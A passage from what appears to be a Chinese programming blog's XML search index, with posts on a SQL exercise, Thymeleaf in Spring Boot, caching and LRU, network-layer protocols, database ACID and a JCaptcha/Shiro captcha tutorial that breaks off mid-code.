salary ||----|------|-----|--------|| 1 | A | m | 2500 || 2 | B | f | 1500 || 3 | C | m | 5500 || 4 | D | f | 500 | 运行你所编写的更新语句之后，将会得到以下表:123456| id | name | sex | salary ||----|------|-----|--------|| 1 | A | f | 2500 || 2 | B | m | 1500 || 3 | C | f | 5500 || 4 | D | m | 500 | 解决方案：1234567# Write your MySQL query statement belowUPDATE salarySET sex = CASE sex WHEN &apos;m&apos; THEN &apos;f&apos; ELSE &apos;m&apos; END;]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>leetcode</tag>
        <tag>SQL题目</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[thymeleaf]]></title>
    <url>%2F2019%2F01%2F01%2Fthymeleaf%2F</url>
    <content type="text"><![CDATA[Spring Boot支持FreeMarker、Groovy、Thymeleaf和Mustache四种模板解析引擎，官方推荐使用Thymeleaf。 spring-boot-starter-thymeleaf在Spring Boot中使用Thymeleaf只需在pom中加入Thymeleaf的starter即可： 1234&lt;dependency&gt; &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt; &lt;artifactId&gt;spring-boot-starter-thymeleaf&lt;/artifactId&gt;&lt;/dependency&gt; 在Spring Boot 1.5.9.RELEASE版本中，默认的Thymeleaf版本为2.1.6.RELEASE版本，这里推荐使用3.0以上版本。在pom中将Thymeleaf的版本修改为3.0.2.RELEASE： 1234&lt;properties&gt; &lt;thymeleaf.version&gt;3.0.2.RELEASE&lt;/thymeleaf.version&gt; &lt;thymeleaf-layout-dialect.version&gt;2.0.1&lt;/thymeleaf-layout-dialect.version&gt;&lt;/properties&gt; 在Spring Boot中，默认的html页面地址为src/main/resources/templates，默认的静态资源地址为src/main/resources/static。 Thymeleaf默认配置在Spring Boot配置文件中可对Thymeleaf的默认配置进行修改： 123456789101112131415161718192021222324#开启模板缓存（默认值：true）spring.thymeleaf.cache=true #Check that the template exists before rendering it.spring.thymeleaf.check-template=true #检查模板位置是否正确（默认值:true）spring.thymeleaf.check-template-location=true#Content-Type的值（默认值：text/html）spring.thymeleaf.content-type=text/html#开启MVC Thymeleaf视图解析（默认值：true）spring.thymeleaf.enabled=true#模板编码spring.thymeleaf.encoding=UTF-8#要被排除在解析之外的视图名称列表，用逗号分隔spring.thymeleaf.excluded-view-names=#要运用于模板之上的模板模式。另见StandardTemplate-ModeHandlers(默认值：HTML5)spring.thymeleaf.mode=HTML5#在构建URL时添加到视图名称前的前缀（默认值：classpath:/templates/）spring.thymeleaf.prefix=classpath:/templates/#在构建URL时添加到视图名称后的后缀（默认值：.html）spring.thymeleaf.suffix=.html#Thymeleaf模板解析器在解析器链中的顺序。默认情况下，它排第一位。顺序从1开始，只有在定义了额外的TemplateResolver Bean时才需要设置这个属性。spring.thymeleaf.template-resolver-order=#可解析的视图名称列表，用逗号分隔spring.thymeleaf.view-names= 一般开发中将spring.thymeleaf.cache设置为false，其他保持默认值即可。 简单示例编写一个简单的Controller： 1234567891011121314@Controllerpublic class IndexController &#123; @RequestMapping(&quot;/account&quot;) public String index(Model m) &#123; List&lt;Account&gt; list = new ArrayList&lt;Account&gt;(); list.add(new Account(&quot;KangKang&quot;, &quot;康康&quot;, &quot;e10adc3949ba59abbe56e&quot;, &quot;超级管理员&quot;, &quot;17777777777&quot;)); list.add(new Account(&quot;Mike&quot;, &quot;麦克&quot;, &quot;e10adc3949ba59abbe56e&quot;, &quot;管理员&quot;, &quot;13444444444&quot;)); list.add(new Account(&quot;Jane&quot;,&quot;简&quot;,&quot;e10adc3949ba59abbe56e&quot;,&quot;运维人员&quot;,&quot;18666666666&quot;)); list.add(new Account(&quot;Maria&quot;, &quot;玛利亚&quot;, &quot;e10adc3949ba59abbe56e&quot;, &quot;清算人员&quot;, &quot;19999999999&quot;)); m.addAttribute(&quot;accountList&quot;,list); return &quot;account&quot;; &#125;&#125; 编写account.html页面： 12345678910111213141516171819202122232425262728&lt;!DOCTYPE html&gt;&lt;html xmlns:th=&quot;http://www.thymeleaf.org&quot;&gt;&lt;head&gt; &lt;title&gt;account&lt;/title&gt; &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt; &lt;link rel=&quot;stylesheet&quot; th:href=&quot;@&#123;/css/style.css&#125;&quot; type=&quot;text/css&quot;&gt;&lt;/head&gt;&lt;body&gt; &lt;table&gt; &lt;tr&gt; &lt;th&gt;no&lt;/th&gt; &lt;th&gt;account&lt;/th&gt; &lt;th&gt;name&lt;/th&gt; &lt;th&gt;password&lt;/th&gt; &lt;th&gt;accountType&lt;/th&gt; &lt;th&gt;tel&lt;/th&gt; &lt;/tr&gt; &lt;tr th:each=&quot;list,stat : $&#123;accountList&#125;&quot;&gt; &lt;td th:text=&quot;$&#123;stat.count&#125;&quot;&gt;&lt;/td&gt; &lt;td th:text=&quot;$&#123;list.account&#125;&quot;&gt;&lt;/td&gt; &lt;td th:text=&quot;$&#123;list.name&#125;&quot;&gt;&lt;/td&gt; &lt;td th:text=&quot;$&#123;list.password&#125;&quot;&gt;&lt;/td&gt; &lt;td th:text=&quot;$&#123;list.accountType&#125;&quot;&gt;&lt;/td&gt; &lt;td th:text=&quot;$&#123;list.tel&#125;&quot;&gt;&lt;/td&gt; &lt;/tr&gt; &lt;/table&gt;&lt;/body&gt;&lt;/html&gt; 最终项目目录如下所示： 启动项目，访问http://localhost:8080/web/account：]]></content>
      <categories>
        <category>springboot</category>
      </categories>
      <tags>
        <tag>thymeleaf</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[缓存]]></title>
    <url>%2F2018%2F12%2F01%2F%E7%BC%93%E5%AD%98%2F</url>
    <content type="text"><![CDATA[一、缓存特征命中率当某个请求能够通过访问缓存而得到响应时，称为缓存命中。 缓存命中率越高，缓存的利用率也就越高。 最大空间缓存通常位于内存中，内存的空间通常比磁盘空间小的多，因此缓存的最大空间不可能非常大。 当缓存存放的数据量超过最大空间时，就需要淘汰部分数据来存放新到达的数据。 淘汰策略 FIFO（First In First Out）：先进先出策略，在实时性的场景下，需要经常访问最新的数据，那么就可以使用 FIFO，使得最先进入的数据（最晚的数据）被淘汰。 LRU（Least Recently Used）：最近最久未使用策略，优先淘汰最久未使用的数据，也就是上次被访问时间距离现在最久的数据。该策略可以保证内存中的数据都是热点数据，也就是经常被访问的数据，从而保证缓存命中率。 LFU（Least Frequently Used）：最不经常使用策略，优先淘汰一段时间内使用次数最少的数据。 二、LRU以下是基于 双向链表 + HashMap 的 LRU 算法实现，对算法的解释如下： 访问某个节点时，将其从原来的位置删除，并重新插入到链表头部。这样就能保证链表尾部存储的就是最近最久未使用的节点，当节点数量大于缓存最大空间时就淘汰链表尾部的节点。 为了使删除操作时间复杂度为 O(1)，就不能采用遍历的方式找到某个节点。HashMap 存储着 Key 到节点的映射，通过 Key 就能以 O(1) 的时间得到节点，然后再以 O(1) 的时间将其从双向队列中删除。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123public class LRU&lt;K, V&gt; implements Iterable&lt;K&gt; &#123; private Node head; private Node tail; private HashMap&lt;K, Node&gt; map; private int maxSize; private class Node &#123; Node pre; Node next; K k; V v; public Node(K k, V v) &#123; this.k = k; this.v = v; &#125; &#125; public LRU(int maxSize) &#123; this.maxSize = maxSize; this.map = new HashMap&lt;&gt;(maxSize * 4 / 3); head = new Node(null, null); tail = new Node(null, null); head.next = tail; tail.pre = head; &#125; public V get(K key) &#123; if (!map.containsKey(key)) &#123; return null; &#125; Node node = map.get(key); unlink(node); appendHead(node); return node.v; &#125; public void put(K key, V value) &#123; if (map.containsKey(key)) &#123; Node node = map.get(key); unlink(node); &#125; Node node = new Node(key, value); map.put(key, node); appendHead(node); if (map.size() &gt; maxSize) &#123; Node toRemove = removeTail(); map.remove(toRemove.k); &#125; &#125; private void unlink(Node node) &#123; Node pre = node.pre; Node next = node.next; pre.next = next; next.pre = pre; node.pre = null; node.next = null; &#125; private void appendHead(Node node) &#123; Node next = head.next; node.next = next; next.pre = node; node.pre = head; head.next = node; &#125; private Node removeTail() &#123; Node node = tail.pre; Node pre = node.pre; tail.pre = pre; pre.next = tail; node.pre = null; node.next = null; return node; &#125; @Override public Iterator&lt;K&gt; iterator() &#123; return new Iterator&lt;K&gt;() &#123; private Node cur = head.next; @Override public boolean hasNext() &#123; return cur != tail; &#125; @Override public K next() &#123; Node node = cur; cur = cur.next; return node.k; &#125; &#125;; &#125;&#125; 三、缓存位置浏览器当 HTTP 响应允许进行缓存时，浏览器会将 HTML、CSS、JavaScript、图片等静态资源进行缓存。 ISP网络服务提供商（ISP）是网络访问的第一跳，通过将数据缓存在 ISP 中能够大大提高用户的访问速度。 反向代理反向代理位于服务器之前，请求与响应都需要经过反向代理。通过将数据缓存在反向代理，在用户请求反向代理时就可以直接使用缓存进行响应。 本地缓存使用 Guava Cache 将数据缓存在服务器本地内存中，服务器代码可以直接读取本地内存中的缓存，速度非常快。 分布式缓存使用 Redis、Memcache 等分布式缓存将数据缓存在分布式缓存系统中。 相对于本地缓存来说，分布式缓存单独部署，可以根据需求分配硬件资源。不仅如此，服务器集群都可以访问分布式缓存，而本地缓存需要在服务器集群之间进行同步，实现难度和性能开销上都非常大。 数据库缓存MySQL 等数据库管理系统具有自己的查询缓存机制来提高查询效率。 四、CDN内容分发网络（Content distribution network，CDN）是一种互连的网络系统，它利用更靠近用户的服务器从而更快更可靠地将 HTML、CSS、JavaScript、音乐、图片、视频等静态资源分发给用户。 CDN 主要有以下优点： 更快地将数据分发给用户； 通过部署多台服务器，从而提高系统整体的带宽性能； 多台服务器可以看成是一种冗余机制，从而具有高可用性。 五、缓存问题缓存穿透指的是对某个一定不存在的数据进行请求，该请求将会穿透缓存到达数据库。 解决方案： 对这些不存在的数据缓存一个空数据； 对这类请求进行过滤。 缓存雪崩指的是由于数据没有被加载到缓存中，或者缓存数据在同一时间大面积失效（过期），又或者缓存服务器宕机，导致大量的请求都到达数据库。 在有缓存的系统中，系统非常依赖于缓存，缓存分担了很大一部分的数据请求。当发生缓存雪崩时，数据库无法处理这么大的请求，导致数据库崩溃。 解决方案： 为了防止缓存在同一时间大面积过期导致的缓存雪崩，可以通过观察用户行为，合理设置缓存过期时间来实现； 为了防止缓存服务器宕机出现的缓存雪崩，可以使用分布式缓存，分布式缓存中每一个节点只缓存部分的数据，当某个节点宕机时可以保证其它节点的缓存仍然可用。 也可以进行缓存预热，避免在系统刚启动不久由于还未将大量数据进行缓存而导致缓存雪崩。 缓存一致性缓存一致性要求数据更新的同时缓存数据也能够实时更新。 解决方案： 在数据更新的同时立即去更新缓存； 在读缓存之前先判断缓存是否是最新的，如果不是最新的先进行更新。 要保证缓存一致性需要付出很大的代价，缓存数据最好是那些对一致性要求不高的数据，允许缓存数据存在一些脏数据。 六、数据分布哈希分布哈希分布就是将数据计算哈希值之后，按照哈希值分配到不同的节点上。例如有 N 个节点，数据的主键为 key，则将该数据分配的节点序号为：hash(key)%N。 传统的哈希分布算法存在一个问题：当节点数量变化时，也就是 N 值变化，那么几乎所有的数据都需要重新分布，将导致大量的数据迁移。 顺序分布将数据划分为多个连续的部分，按数据的 ID 或者时间分布到不同节点上。例如 User 表的 ID 范围为 1 ~ 7000，使用顺序分布可以将其划分成多个子表，对应的主键范围为 1 ~ 1000，1001 ~ 2000，…，6001 ~ 7000。 顺序分布相比于哈希分布的主要优点如下： 能保持数据原有的顺序； 并且能够准确控制每台服务器存储的数据量，从而使得存储空间的利用率最大。 七、一致性哈希Distributed Hash Table（DHT） 是一种哈希分布方式，其目的是为了克服传统哈希分布在服务器节点数量变化时大量数据迁移的问题。 基本原理将哈希空间 [0, 2n-1] 看成一个哈希环，每个服务器节点都配置到哈希环上。每个数据对象通过哈希取模得到哈希值之后，存放到哈希环中顺时针方向第一个大于等于该哈希值的节点上。 一致性哈希在增加或者删除节点时只会影响到哈希环中相邻的节点，例如下图中新增节点 X，只需要将它前一个节点 C 上的数据重新进行分布即可，对于节点 A、B、D 都没有影响。 虚拟节点上面描述的一致性哈希存在数据分布不均匀的问题，节点存储的数据量有可能会存在很大的不同。 数据不均匀主要是因为节点在哈希环上分布的不均匀，这种情况在节点数量很少的情况下尤其明显。 解决方式是通过增加虚拟节点，然后将虚拟节点映射到真实节点上。虚拟节点的数量比真实节点来得多，那么虚拟节点在哈希环上分布的均匀性就会比原来的真实节点好，从而使得数据分布也更加均匀。]]></content>
      <categories>
        <category>系统设计</category>
      </categories>
      <tags>
        <tag>缓存</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络层]]></title>
    <url>%2F2018%2F12%2F01%2F%E7%BD%91%E7%BB%9C%E5%B1%82%2F</url>
    <content type="text"><![CDATA[概述因为网络层是整个互联网的核心，因此应当让网络层尽可能简单。网络层向上只提供简单灵活的、无连接的、尽最大努力交互的数据报服务。 使用 IP 协议，可以把异构的物理网络连接起来，使得在网络层看起来好像是一个统一的网络。 与 IP 协议配套使用的还有三个协议： 地址解析协议 ARP（Address Resolution Protocol） 网际控制报文协议 ICMP（Internet Control Message Protocol） 网际组管理协议 IGMP（Internet Group Management Protocol） IP 数据报格式 版本 : 有 4（IPv4）和 6（IPv6）两个值； 首部长度 : 占 4 位，因此最大值为 15。值为 1 表示的是 1 个 32 位字的长度，也就是 4 字节。因为固定部分长度为 20 字节，因此该值最小为 5。如果可选字段的长度不是 4 字节的整数倍，就用尾部的填充部分来填充。 区分服务 : 用来获得更好的服务，一般情况下不使用。 总长度 : 包括首部长度和数据部分长度。 生存时间 ：TTL，它的存在是为了防止无法交付的数据报在互联网中不断兜圈子。以路由器跳数为单位，当 TTL 为 0 时就丢弃数据报。 协议 ：指出携带的数据应该上交给哪个协议进行处理，例如 ICMP、TCP、UDP 等。 首部检验和 ：因为数据报每经过一个路由器，都要重新计算检验和，因此检验和不包含数据部分可以减少计算的工作量。 标识 : 在数据报长度过长从而发生分片的情况下，相同数据报的不同分片具有相同的标识符。 片偏移 : 和标识符一起，用于发生分片的情况。片偏移的单位为 8 字节。 IP 地址编址方式IP 地址的编址方式经历了三个历史阶段： 分类 子网划分 无分类 1. 分类由两部分组成，网络号和主机号，其中不同分类具有不同的网络号长度，并且是固定的。 IP 地址 ::= {&lt; 网络号 &gt;, &lt; 主机号 &gt;} 2. 子网划分通过在主机号字段中拿一部分作为子网号，把两级 IP 地址划分为三级 IP 地址。 IP 地址 ::= {&lt; 网络号 &gt;, &lt; 子网号 &gt;, &lt; 主机号 &gt;} 要使用子网，必须配置子网掩码。一个 B 类地址的默认子网掩码为 255.255.0.0，如果 B 类地址的子网占两个比特，那么子网掩码为 11111111 11111111 11000000 00000000，也就是 255.255.192.0。 注意，外部网络看不到子网的存在。 3. 无分类无分类编址 CIDR 消除了传统 A 类、B 类和 C 类地址以及划分子网的概念，使用网络前缀和主机号来对 IP 地址进行编码，网络前缀的长度可以根据需要变化。 IP 地址 ::= {&lt; 网络前缀号 &gt;, &lt; 主机号 &gt;} CIDR 的记法上采用在 IP 地址后面加上网络前缀长度的方法，例如 128.14.35.7/20 表示前 20 位为网络前缀。 CIDR 的地址掩码可以继续称为子网掩码，子网掩码首 1 长度为网络前缀的长度。 一个 CIDR 地址块中有很多地址，一个 CIDR 表示的网络就可以表示原来的很多个网络，并且在路由表中只需要一个路由就可以代替原来的多个路由，减少了路由表项的数量。把这种通过使用网络前缀来减少路由表项的方式称为路由聚合，也称为 构成超网 。 在路由表中的项目由“网络前缀”和“下一跳地址”组成，在查找时可能会得到不止一个匹配结果，应当采用最长前缀匹配来确定应该匹配哪一个。 地址解析协议 ARP网络层实现主机之间的通信，而链路层实现具体每段链路之间的通信。因此在通信过程中，IP 数据报的源地址和目的地址始终不变，而 MAC 地址随着链路的改变而改变。 ARP 实现由 IP 地址得到 MAC 地址。 每个主机都有一个 ARP 高速缓存，里面有本局域网上的各主机和路由器的 IP 地址到 MAC 地址的映射表。 如果主机 A 知道主机 B 的 IP 地址，但是 ARP 高速缓存中没有该 IP 地址到 MAC 地址的映射，此时主机 A 通过广播的方式发送 ARP 请求分组，主机 B 收到该请求后会发送 ARP 响应分组给主机 A 告知其 MAC 地址，随后主机 A 向其高速缓存中写入主机 B 的 IP 地址到 MAC 地址的映射。 网际控制报文协议 ICMPICMP 是为了更有效地转发 IP 数据报和提高交付成功的机会。它封装在 IP 数据报中，但是不属于高层协议。 ICMP 报文分为差错报告报文和询问报文。 1. PingPing 是 ICMP 的一个重要应用，主要用来测试两台主机之间的连通性。 Ping 的原理是通过向目的主机发送 ICMP Echo 请求报文，目的主机收到之后会发送 Echo 回答报文。Ping 会根据时间和成功响应的次数估算出数据包往返时间以及丢包率。 2. TracerouteTraceroute 是 ICMP 的另一个应用，用来跟踪一个分组从源点到终点的路径。 Traceroute 发送的 IP 数据报封装的是无法交付的 UDP 用户数据报，并由目的主机发送终点不可达差错报告报文。 源主机向目的主机发送一连串的 IP 数据报。第一个数据报 P1 的生存时间 TTL 设置为 1，当 P1 到达路径上的第一个路由器 R1 时，R1 收下它并把 TTL 减 1，此时 TTL 等于 0，R1 就把 P1 丢弃，并向源主机发送一个 ICMP 时间超过差错报告报文； 源主机接着发送第二个数据报 P2，并把 TTL 设置为 2。P2 先到达 R1，R1 收下后把 TTL 减 1 再转发给 R2，R2 收下后也把 TTL 减 1，由于此时 TTL 等于 0，R2 就丢弃 P2，并向源主机发送一个 ICMP 时间超过差错报文。 不断执行这样的步骤，直到最后一个数据报刚刚到达目的主机，主机不转发数据报，也不把 TTL 值减 1。但是因为数据报封装的是无法交付的 UDP，因此目的主机要向源主机发送 ICMP 终点不可达差错报告报文。 之后源主机知道了到达目的主机所经过的路由器 IP 地址以及到达每个路由器的往返时间。 虚拟专用网 VPN由于 IP 地址的紧缺，一个机构能申请到的 IP 地址数往往远小于本机构所拥有的主机数。并且一个机构并不需要把所有的主机接入到外部的互联网中，机构内的计算机可以使用仅在本机构有效的 IP 地址（专用地址）。 有三个专用地址块： 10.0.0.0 ~ 10.255.255.255 172.16.0.0 ~ 172.31.255.255 192.168.0.0 ~ 192.168.255.255 VPN 使用公用的互联网作为本机构各专用网之间的通信载体。专用指机构内的主机只与本机构内的其它主机通信；虚拟指好像是，而实际上并不是，它有经过公用的互联网。 下图中，场所 A 和 B 的通信经过互联网，如果场所 A 的主机 X 要和另一个场所 B 的主机 Y 通信，IP 数据报的源地址是 10.1.0.1，目的地址是 10.2.0.3。数据报先发送到与互联网相连的路由器 R1，R1 对内部数据进行加密，然后重新加上数据报的首部，源地址是路由器 R1 的全球地址 125.1.2.3，目的地址是路由器 R2 的全球地址 194.4.5.6。路由器 R2 收到数据报后将数据部分进行解密，恢复原来的数据报，此时目的地址为 10.2.0.3，就交付给 Y。 网络地址转换 NAT专用网内部的主机使用本地 IP 地址又想和互联网上的主机通信时，可以使用 NAT 来将本地 IP 转换为全球 IP。 在以前，NAT 将本地 IP 和全球 IP 一一对应，这种方式下拥有 n 个全球 IP 地址的专用网内最多只可以同时有 n 台主机接入互联网。为了更有效地利用全球 IP 地址，现在常用的 NAT 转换表把传输层的端口号也用上了，使得多个专用网内部的主机共用一个全球 IP 地址。使用端口号的 NAT 也叫做网络地址与端口转换 NAPT。 路由器的结构路由器从功能上可以划分为：路由选择和分组转发。 分组转发结构由三个部分组成：交换结构、一组输入端口和一组输出端口。 路由器分组转发流程 从数据报的首部提取目的主机的 IP 地址 D，得到目的网络地址 N。 若 N 就是与此路由器直接相连的某个网络地址，则进行直接交付； 若路由表中有目的地址为 D 的特定主机路由，则把数据报传送给表中所指明的下一跳路由器； 若路由表中有到达网络 N 的路由，则把数据报传送给路由表中所指明的下一跳路由器； 若路由表中有一个默认路由，则把数据报传送给路由表中所指明的默认路由器； 报告转发分组出错。 路由选择协议路由选择协议都是自适应的，能随着网络通信量和拓扑结构的变化而自适应地进行调整。 互联网可以划分为许多较小的自治系统 AS，一个 AS 可以使用一种和别的 AS 不同的路由选择协议。 可以把路由选择协议划分为两大类： 自治系统内部的路由选择：RIP 和 OSPF 自治系统间的路由选择：BGP 1. 内部网关协议 RIPRIP 是一种基于距离向量的路由选择协议。距离是指跳数，直接相连的路由器跳数为 1。跳数最多为 15，超过 15 表示不可达。 RIP 按固定的时间间隔仅和相邻路由器交换自己的路由表，经过若干次交换之后，所有路由器最终会知道到达本自治系统中任何一个网络的最短距离和下一跳路由器地址。 距离向量算法： 对地址为 X 的相邻路由器发来的 RIP 报文，先修改报文中的所有项目，把下一跳字段中的地址改为 X，并把所有的距离字段加 1； 对修改后的 RIP 报文中的每一个项目，进行以下步骤： 若原来的路由表中没有目的网络 N，则把该项目添加到路由表中； 否则：若下一跳路由器地址是 X，则把收到的项目替换原来路由表中的项目；否则：若收到的项目中的距离 d 小于路由表中的距离，则进行更新（例如原始路由表项为 Net2, 5, P，新表项为 Net2, 4, X，则更新）；否则什么也不做。 若 3 分钟还没有收到相邻路由器的更新路由表，则把该相邻路由器标为不可达，即把距离置为 16。 RIP 协议实现简单，开销小。但是 RIP 能使用的最大距离为 15，限制了网络的规模。并且当网络出现故障时，要经过比较长的时间才能将此消息传送到所有路由器。 2. 内部网关协议 OSPF开放最短路径优先 OSPF，是为了克服 RIP 的缺点而开发出来的。 开放表示 OSPF 不受某一家厂商控制，而是公开发表的；最短路径优先表示使用了 Dijkstra 提出的最短路径算法 SPF。 OSPF 具有以下特点： 向本自治系统中的所有路由器发送信息，这种方法是洪泛法。 发送的信息就是与相邻路由器的链路状态，链路状态包括与哪些路由器相连以及链路的度量，度量用费用、距离、时延、带宽等来表示。 只有当链路状态发生变化时，路由器才会发送信息。 所有路由器都具有全网的拓扑结构图，并且是一致的。相比于 RIP，OSPF 的更新过程收敛的很快。 3. 外部网关协议 BGPBGP（Border Gateway Protocol，边界网关协议） AS 之间的路由选择很困难，主要是由于： 互联网规模很大； 各个 AS 内部使用不同的路由选择协议，无法准确定义路径的度量； AS 之间的路由选择必须考虑有关的策略，比如有些 AS 不愿意让其它 AS 经过。 BGP 只能寻找一条比较好的路由，而不是最佳路由。 每个 AS 都必须配置 BGP 发言人，通过在两个相邻 BGP 发言人之间建立 TCP 连接来交换路由信息。]]></content>
      <categories>
        <category>网络</category>
      </categories>
      <tags>
        <tag>计算机网络</tag>
        <tag>网络层</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[数据库事务]]></title>
    <url>%2F2018%2F11%2F17%2F%E6%95%B0%E6%8D%AE%E5%BA%93%E4%BA%8B%E5%8A%A1%2F</url>
    <content type="text"><![CDATA[数据库事务数据库事务是数据库管理系统执行过程中的一个逻辑单位，由一个有限的数据库操作序列构成；事务需要满足ACID特性。 ACID并非任意的对数据库的操作序列都是数据库事务。数据库事务拥有以下四个特性，习惯上被称之为ACID特性。 名称 内容 原子性（Atomicity） 事务作为一个整体被执行，包含在其中的对数据库的操作要么全部被执行，要么都不执行。 一致性（Consistency） 事务应确保数据库的状态从一个一致状态转变为另一个一致状态。一致状态的含义是数据库中的数据应满足完整性约束。 隔离性（Isolation） 多个事务并发执行时，一个事务的执行不应影响其他事务的执行。 持久性（Durability） 已被提交的事务对数据库的修改应该永久保存在数据库中。]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>事务</tag>
        <tag>ACID</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[集成验证码]]></title>
    <url>%2F2018%2F11%2F16%2F%E9%9B%86%E6%88%90%E9%AA%8C%E8%AF%81%E7%A0%81%2F</url>
    <content type="text"><![CDATA[集成验证码在做用户登录功能时，很多时候都需要验证码支持，验证码的目的是为了防止机器人模拟真实用户登录而恶意访问，如暴力破解用户密码 / 恶意评论等。目前也有一些验证码比较简单，通过一些 OCR 工具就可以解析出来；另外还有一些验证码比较复杂（一般通过如扭曲、加线条 / 噪点等干扰）防止 OCR 工具识别；但是在中国就是人多，机器干不了的可以交给人来完成，所以在中国就有很多打码平台，人工识别验证码；因此即使比较复杂的如填字、算数等类型的验证码还是能识别的。所以验证码也不是绝对可靠的，目前比较可靠还是手机验证码，但是对于用户来说相对于验证码还是比较麻烦的。 对于验证码图片的生成，可以自己通过如 Java 提供的图像 API 自己去生成，也可以借助如 JCaptcha 这种开源 Java 类库生成验证码图片；JCaptcha 提供了常见的如扭曲、加噪点等干扰支持。本章代码基于《第十六章 综合实例》。 一、添加 JCaptcha 依赖 12345678910111213141516&lt;dependency&gt; &lt;groupId&gt;com.octo.captcha&lt;/groupId&gt; &lt;artifactId&gt;jcaptcha&lt;/artifactId&gt; &lt;version&gt;2.0-alpha-1&lt;/version&gt;&lt;/dependency&gt;&lt;dependency&gt; &lt;groupId&gt;com.octo.captcha&lt;/groupId&gt; &lt;artifactId&gt;jcaptcha-integration-simple-servlet&lt;/artifactId&gt; &lt;version&gt;2.0-alpha-1&lt;/version&gt; &lt;exclusions&gt; &lt;exclusion&gt; &lt;artifactId&gt;servlet-api&lt;/artifactId&gt; &lt;groupId&gt;javax.servlet&lt;/groupId&gt; &lt;/exclusion&gt; &lt;/exclusions&gt;&lt;/dependency&gt;&amp;nbsp; com.octo.captcha.jcaptcha 提供了 jcaptcha 核心；而 jcaptcha-integration-simple-servlet 提供了与 Servlet 集成。 二、GMailEngine 来自 &lt;https://code.google.com/p/musicvalley/source/browse/trunk/musicvalley/doc/springSecurity/springSecurityIII/src/main/java/com/spring/security/jcaptcha/GMailEngine.java?spec=svn447&amp;r=447（目前无法访问了），仿照&gt; JCaptcha2.0 编写类似 GMail 验证码的样式；具体请参考 com.github.zhangkaitao.shiro.chapter22.jcaptcha.GMailEngine。 三、MyManageableImageCaptchaService 提供了判断仓库中是否有相应的验证码存在。 123456789101112131415public class MyManageableImageCaptchaService extends DefaultManageableImageCaptchaService &#123; public MyManageableImageCaptchaService( com.octo.captcha.service.captchastore.CaptchaStore captchaStore, com.octo.captcha.engine.CaptchaEngine captchaEngine, int minGuarantedStorageDelayInSeconds, int maxCaptchaStoreSize, int captchaStoreLoadBeforeGarbageCollection) &#123; super(captchaStore, captchaEngine, minGuarantedStorageDelayInSeconds, maxCaptchaStoreSize, captchaStoreLoadBeforeGarbageCollection); &#125; public boolean hasCapcha(String id, String userCaptchaResponse) &#123; return store.getCaptcha(id).validateResponse(userCaptchaResponse); &#125;&#125; 四、JCaptcha 工具类 提供相应的 API 来验证当前请求输入的验证码是否正确。 12345678910111213141516171819202122232425262728293031public class JCaptcha &#123; public static final MyManageableImageCaptchaService captchaService = new MyManageableImageCaptchaService(new FastHashMapCaptchaStore(), new GMailEngine(), 180, 100000, 75000); public static boolean validateResponse( HttpServletRequest request, String userCaptchaResponse) &#123; if (request.getSession(false) == null) return false; boolean validated = false; try &#123; String id = request.getSession().getId(); validated = captchaService.validateResponseForID(id, userCaptchaResponse) .booleanValue(); &#125; catch (CaptchaServiceException e) &#123; e.printStackTrace(); &#125; return validated; &#125; public static boolean hasCaptcha( HttpServletRequest request, String userCaptchaResponse) &#123; if (request.getSession(false) == null) return false; boolean validated = false; try &#123; String id = request.getSession().getId(); validated = captchaService.hasCapcha(id, userCaptchaResponse); &#125; catch (CaptchaServiceException e) &#123; e.printStackTrace(); &#125; return validated; &#125;&#125;&amp;nbsp; validateResponse()：验证当前请求输入的验证码否正确；并从 CaptchaService 中删除已经生成的验证码； hasCaptcha()：验证当前请求输入的验证码是否正确；但不从 CaptchaService 中删除已经生成的验证码（比如 Ajax 验证时可以使用，防止多次生成验证码）； 五、JCaptchaFilter 用于生成验证码图片的过滤器。 123456789101112131415161718public class JCaptchaFilter extends OncePerRequestFilter &#123; protected void doFilterInternal(HttpServletRequest request, HttpServletResponse response, FilterChain filterChain) throws ServletException, IOException &#123; response.setDateHeader(&quot;Expires&quot;, 0L); response.setHeader(&quot;Cache-Control&quot;, &quot;no-store, no-cache, must-revalidate&quot;); response.addHeader(&quot;Cache-Control&quot;, &quot;post-check=0, pre-check=0&quot;); response.setHeader(&quot;Pragma&quot;, &quot;no-cache&quot;); response.setContentType(&quot;image/jpeg&quot;); String id = request.getRequestedSessionId(); BufferedImage bi = JCaptcha.captchaService.getImageChallengeForID(id); ServletOutputStream out = response.getOutputStream(); ImageIO.write(bi, &quot;jpg&quot;, out); try &#123; out.flush(); &#125; finally &#123; out.close(); &#125; &#125;&#125;&amp;nbsp; CaptchaService 使用当前会话 ID 当作 key 获取相应的验证码图片；另外需要设置响应内容不进行浏览器端缓存。 12345678910&lt;filter&gt; &lt;filter-name&gt;JCaptchaFilter&lt;/filter-name&gt; &lt;filter-class&gt; com.github.zhangkaitao.shiro.chapter22.jcaptcha.JCaptchaFilter &lt;/filter-class&gt; &lt;/filter&gt; &lt;filter-mapping&gt; &lt;filter-name&gt;JCaptchaFilter&lt;/filter-name&gt; &lt;url-pattern&gt;/jcaptcha.jpg&lt;/url-pattern&gt;&lt;/filter-mapping&gt;&amp;nbsp; 这样就可以在页面使用 /jcaptcha.jpg 地址显示验证码图片。 六、JCaptchaValidateFilter 用于验证码验证的 Shiro 过滤器。 123456789101112131415161718192021222324252627282930public class JCaptchaValidateFilter extends AccessControlFilter &#123; private boolean jcaptchaEbabled = true;//是否开启验证码支持 private String jcaptchaParam = &quot;jcaptchaCode&quot;;//前台提交的验证码参数名 private String failureKeyAttribute = &quot;shiroLoginFailure&quot;; //验证失败后存储到的属性名 public void setJcaptchaEbabled(boolean jcaptchaEbabled) &#123; this.jcaptchaEbabled = jcaptchaEbabled; &#125; public void setJcaptchaParam(String jcaptchaParam) &#123; this.jcaptchaParam = jcaptchaParam; &#125; public void setFailureKeyAttribute(String failureKeyAttribute) &#123; this.failureKeyAttribute = failureKeyAttribute; &#125; protected boolean 